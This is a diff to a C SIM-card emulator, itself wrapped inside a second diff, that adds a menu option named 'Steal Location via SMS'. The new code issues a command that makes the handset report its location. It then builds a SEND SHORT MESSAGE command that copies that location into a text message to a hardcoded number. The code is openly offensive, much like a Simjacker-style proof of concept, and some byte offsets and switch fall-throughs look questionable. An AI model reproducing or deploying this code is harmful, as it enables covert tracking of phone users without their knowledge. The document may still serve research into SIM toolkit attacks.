@@ -1,0 +1,153 @@
+diff --git a/src/proactive.c b/src/proactive.c
+index a9c4fe1..30e28a8 100644
+--- a/src/proactive.c
++++ b/src/proactive.c
+@@ -1273,6 +1273,7 @@ typedef enum app_default__screen_e
+     APP_DEFAULT__SCREEN__PLAY_TONE,
+     APP_DEFAULT__SCREEN__OPEN_CHANNEL,
+     APP_DEFAULT__SCREEN__SET_UP_CALL,
++    APP_DEFAULT__SCREEN__STEAL_LOCATION_VIA_SMS,
+     APP_DEFAULT__SCREEN__INVALID,
+ } app_default__screen_et;
+ 
+@@ -1348,9 +1349,9 @@ static swicc_ret_et proactive_app_default__step(
+                 APP_DEFAULT__SCREEN__HOME)
+         {
+             static char const *const item_text[] = {
+-                "C: LAUNCH BROWSER", "C: DISPLAY TEXT", "C: SET UP MENU",
+-                "C: PLAY TONE",      "C: OPEN CHANNEL", "C: SET UP CALL",
+-            };
++                "C: LAUNCH BROWSER",     "C: DISPLAY TEXT", "C: SET UP MENU",
++                "C: PLAY TONE",          "C: OPEN CHANNEL", "C: SET UP CALL",
++                "Steal Location via SMS"};
+             uint8_t const item_count = sizeof(item_text) / sizeof(item_text[0]);
+             for (uint8_t item_i = 0; item_i < item_count; ++item_i)
+             {
+@@ -1498,6 +1499,28 @@ static swicc_ret_et proactive_app_default__step(
+             command.set_up_menu.item = item;
+             command_created = true;
+         }
++        else if (proactive->app_default.select_screen_new ==
++                     APP_DEFAULT__SCREEN__STEAL_LOCATION_VIA_SMS &&
++                 proactive->app_default.select_screen_last !=
++                     APP_DEFAULT__SCREEN__STEAL_LOCATION_VIA_SMS)
++        {
++            static char const *const item_text[] = {"Back", "Run"};
++            uint8_t const item_count = sizeof(item_text) / sizeof(item_text[0]);
++
++            for (uint8_t item_i = 0; item_i < item_count; ++item_i)
++            {
++                item[item_i].valid = true;
++                item[item_i].item_identifier = item_i + 1;
++                item[item_i].item_text_string = item_text[item_i];
++            }
++
++            command.set_up_menu.alpha_identifier.valid = true;
++            command.set_up_menu.alpha_identifier.alpha_identifier =
++                "Steal Location via SMS";
++            command.set_up_menu.item_count = item_count;
++            command.set_up_menu.item = item;
++            command_created = true;
++        }
+ 
+         if (command_created)
+         {
+@@ -1521,6 +1544,58 @@ sim__proactive__terminal_response_ft proactive_app_default__terminal_response;
+ swicc_ret_et proactive_app_default__terminal_response(
+     swsim__proactive_st *const proactive)
+ {
++    fprintf(stderr, "Terminal response: parsing.\n");
++    fprintf(stderr, "Terminal response: ");
++    for (uint8_t response_idx = 0U; response_idx < proactive->response_length;
++         ++response_idx)
++    {
++        fprintf(stderr, "%02X", proactive->response[response_idx]);
++    }
++    fprintf(stderr, "\n");
++    for (uint8_t response_idx = 0U; response_idx < proactive->response_length;
++         ++response_idx)
++    {
++        if (proactive->response[response_idx] == 0x13)
++        {
++            fprintf(stderr, "Card response: sending SMS with location.\n");
++            uint8_t const payload[] = {0xD0, 0x19, 0x81, 0x03, 0x00, 0x13,
++                                       0x00, 0x82, 0x02, 0x81, 0x83, 0x8B,
++                                       0x0E, 0x01, 0x00, 0x07, 0x91, 0x00,
++                                       0x07, 0x32, 0xF5, 0x00, 0x00};
++            memcpy(&proactive->command, payload, sizeof(payload));
++            uint8_t const location_information_length =
++                (uint8_t)(proactive->response_length - response_idx);
++            proactive->response[response_idx + 1] = location_information_length;
++            memcpy(&proactive->command[sizeof(payload) + 1],
++                   &proactive->response[response_idx],
++                   location_information_length);
++            proactive->command_length =
++                sizeof(payload) + 1 + location_information_length;
++            proactive->app_default_response_wait = true;
++            proactive->command_count += 1;
++
++            fprintf(stderr, "Card response: ");
++            for (uint8_t command_idx = 0U;
++                 command_idx < proactive->command_length; ++command_idx)
++            {
++                fprintf(stderr, "%02X", proactive->command[command_idx]);
++            }
++            fprintf(stderr, "\n");
++
++            return SWICC_RET_SUCCESS;
++        }
++        else
++        {
++            // Skip over the TLV.
++            response_idx +=
++                (uint8_t)(1U + proactive->response[response_idx + 1]);
++            if (response_idx >= proactive->response_length)
++            {
++                break;
++            }
++        }
++    }
++
+     proactive->app_default_response_wait = false;
+     return SWICC_RET_SUCCESS;
+ }
+@@ -1707,6 +1782,11 @@ swicc_ret_et proactive_app_default__envelope(
+                                             .select_screen_new =
+                                             APP_DEFAULT__SCREEN__SET_UP_CALL;
+                                         break;
++                                    case 0x07:
++                                        proactive->app_default
++                                            .select_screen_new =
++                                            APP_DEFAULT__SCREEN__STEAL_LOCATION_VIA_SMS;
++                                        break;
+                                     default:
+                                         break;
+                                     }
+@@ -2466,6 +2546,27 @@ swicc_ret_et proactive_app_default__envelope(
+                                         break;
+                                     }
+                                     break;
++                                case APP_DEFAULT__SCREEN__STEAL_LOCATION_VIA_SMS:
++                                    switch (item_identifier)
++                                    {
++                                    case 0x01:
++                                        proactive->app_default
++                                            .select_screen_new =
++                                            APP_DEFAULT__SCREEN__HOME;
++                                        break;
++                                    case 0x02: {
++                                        uint8_t const payload[] = {
++                                            0xD0, 0x09, 0x81, 0x03, 0x00, 0x26,
++                                            0x00, 0x82, 0x02, 0x81, 0x83};
++                                        memcpy(&proactive->command, payload,
++                                               sizeof(payload));
++                                        proactive->command_length =
++                                            sizeof(payload);
++                                        proactive->app_default_response_wait =
++                                            true;
++                                        break;
++                                    }
++                                    }
+                                 default:
+                                     break;
+                                 }
